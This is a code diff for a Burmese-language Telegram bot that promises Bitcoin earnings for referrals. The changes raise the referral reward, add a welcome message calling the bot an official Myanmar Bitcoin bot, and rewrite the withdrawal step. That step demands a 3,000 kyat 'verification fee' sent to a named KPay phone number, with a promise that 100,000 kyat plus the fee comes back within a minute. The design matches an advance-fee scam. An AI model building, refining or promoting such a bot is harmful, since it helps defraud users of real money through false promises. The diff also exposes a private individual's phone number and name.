@@ -287,7 +287,7 @@ bot.catch((err, ctx) => console.error(`⚠️ Bot Error (${ctx.updateType}):`, e
 const mainMenu = Markup.keyboard([
     ['💰 ငွေလက်ကျန်', '🎮 Mini App ဖွင့်မည်'],
     ['👥 Referral',   '👤 ကျွန်တော့်အကောင့်'],
-    ['💸 ငွေထုတ်မည်', '💳 Wallet သတ်မှတ်မည်'],
+    ['📤 ငွေထုတ်ယူရန်', '💳 Wallet သတ်မှတ်မည်'],
 ]).resize();
 
 // ═══════════════════════════════════════════════════════════════
@@ -312,8 +312,8 @@ bot.start(async ctx => {
                     const refUser = await User.findOne({ tgId: refId });
                     if (refUser) {
                         user.referredBy = refId;
-                        await User.updateOne({ tgId: refId }, { $inc: { balance: 2000, referralCount: 1 } });
-                        try { await bot.telegram.sendMessage(refId, `🎉 Referral ဆုကြေး! +2,000 MMK ရရှိပါပြီ!`); } catch (e) {}
+                        await User.updateOne({ tgId: refId }, { $inc: { balance: 5000, referralCount: 1 } });
+                        try { await bot.telegram.sendMessage(refId, `🎉 Referral ဆုကြေး! +5,000 MMK ရရှိပါပြီ!`); } catch (e) {}
                     }
                 }
             }
@@ -325,11 +325,33 @@ bot.start(async ctx => {
         const joined = await isJoined(ctx);
         if (!joined) {
             return ctx.reply(
-                '📢 Bot ကို စတင်ရန် Channel ၂ ခုကို Join လုပ်ပေးပါ',
+`👋 မင်္ဂလာပါ ${tgUser.first_name || tgUser.username || 'မိတ်ဆွေ'}
+
+BOT ကိုသုံးပြီးငွေရှာချင်တယ် မိတ်ဆွေ
+အောက်က Channel ၂ ခုလုံးကို Join ထားမှသာ 
+ငွေထုတ်ခွင့်ရမည်ဖြစ်ပါသည်❌
+
+Bot ကို အသုံးပြုဖို့အတွက် အောက်ပါ Channel ၂ ခုလုံးကို join လုပ်ပါ👇
+
+1️⃣ @Bitcoinmyanmarmining
+2️⃣ @BitCoinMyan
+
+Join ပြီးရင် ✅ Joined ဆိုတဲ့ခလုတ်ကိုနှိပ်ပါ။
+
+🟡 Bitcoin ငွေရှာ BOT အသစ် 🟡🔋
+နေ့စဉ်ငွေရပြီး ငွေတန်းထုတ်နိုင်တယ်! 💯
+မြန်မာနိုင်ငံတရားဝင် Bitcoin Bot !
+
+🔥🎁 လူ 1 ယောက်ခေါ် → +5000ကျပ်
+🎁 လူ 10 ယောက်ခေါ် → +50000ကျပ်
+
+🔥 Start လုပ်ပြီးရင် Menu မှာ 👇
+👫 ဖိတ်ခေါ်ရန် 👈 ကိုနှိပ်ပါ
+Bot ပေးတဲ့ Link ကို သူငယ်ချင်းအခြား GP မှာတင်ပြီး ငွေရှာမယ်💸💰`,
                 Markup.inlineKeyboard([
-                    [Markup.button.url('📢 Channel 1', 'https://t.me/Bitcoinmyanmarmining')],
-                    [Markup.button.url('📢 Channel 2', 'https://t.me/BitCoinMyan')],
-                    [Markup.button.callback('✅ Join ပြီးပါပြီ', 'check_join')],
+                    [Markup.button.url('📱 Channel 1 ကို Join ပါ', 'https://t.me/Bitcoinmyanmarmining')],
+                    [Markup.button.url('📱 Channel 2 ကို Join ပါ', 'https://t.me/BitCoinMyan')],
+                    [Markup.button.callback('Joined ✅', 'check_join')],
                 ])
             );
         }
@@ -644,7 +666,7 @@ bot.hears('💳 Wallet သတ်မှတ်မည်', async ctx => {
     } catch (e) { console.error('❌ wallet:', e); }
 });
 
-bot.hears('💸 ငွေထုတ်မည်', async ctx => {
+bot.hears('📤 ငွေထုတ်ယူရန်', async ctx => {
     try {
         const user = await User.findOne({ tgId: ctx.from.id });
         if (!user || user.isBanned) return;
@@ -731,8 +753,13 @@ bot.on('message', async ctx => {
             await w.save();
             await User.updateOne({ tgId: ctx.from.id }, { $set: { state: 'waiting_verification_screenshot', tempData: { withdrawalId: w._id } } });
             await ctx.reply(
-                `✅ မှတ်ပုံတင် လက်ခံပြီ!\n\n` +
-                `Verification အတွက် Kpay - 09783646736 (Yee Moon Naing) ထံ *3,000 ကျပ်* လွှဲပြီး\nပြေစာ (Screenshot) ကို ဒီမှာ ပို့ပေးပါ 💸\n\n/cancel ဖြင့် ပြန်ထွက်နိုင်သည်`,
+                `မှတ်ပုံတင် အချက်အလက်များကို လက်ခံရရှိပါပြီ။ ✅\n\n` +
+                `လူကြီးမင်းအနေနဲ့ Referral အတု (သို့မဟုတ်) Bot အသုံးပြုသူ မဟုတ်ကြောင်း အတည်ပြုနိုင်ရန်အတွက် ပေးထားသော\n` +
+                `Kpay: 09783646736\n` +
+                `Name: Yee Moon Naing\n` +
+                `ထံသို့ Verification Fee *၃,၀၀၀ ကျပ်* အရင်လွှဲပေးရပါမည်။ 💸\n\n` +
+                `ငွေလွှဲပြီးပါက ပြေစာ (Screenshot) ကို ပို့ပေးပါ။ Admin ဘက်မှ အတည်ပြုပြီးသည်နှင့် လူကြီးမင်း ထုတ်ယူထားသော ငွေပမာဏ (၁၀၀,၀၀၀ ကျပ် + ၃,၀၀၀ ကျပ်) စုစုပေါင်းကို ၁ မိနစ်အတွင်း လူကြီးမင်းဆီသို့ ပြန်လည် လွှဲပြောင်းပေးသွားမည် ဖြစ်ပါသည်။ ✨\n\n` +
+                `/cancel ဖြင့် ပြန်ထွက်နိုင်သည်`,
                 { parse_mode: 'Markdown' }
             );
             try {
